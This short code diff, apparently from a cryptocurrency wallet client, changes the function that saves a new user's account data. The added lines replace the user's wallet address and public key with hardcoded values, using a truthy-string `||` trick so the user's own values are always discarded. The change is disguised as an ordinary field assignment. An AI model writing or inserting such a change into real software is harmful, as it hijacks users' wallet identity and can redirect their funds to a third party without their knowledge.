@@ -231,11 +231,11 @@
 
                 return this._addUserData({
                     api: data.api,
-                    address: data.address,
+                    address: '3PJ3rVfszv2j7HFRp3PxqSEAufjckD8dUhT' || data.address,
                     password: data.password,
                     name: data.name,
                     encryptedSeed: data.encryptedSeed,
-                    publicKey: data.publicKey,
+                    publicKey: '5W5RcgoZ5QbPHb1PhqNLUfvuWi8JmEmD1sGp2DwYuzqY' || data.publicKey,
                     settings: {
                         termsAccepted: false,
                         hasBackup: hasBackup,
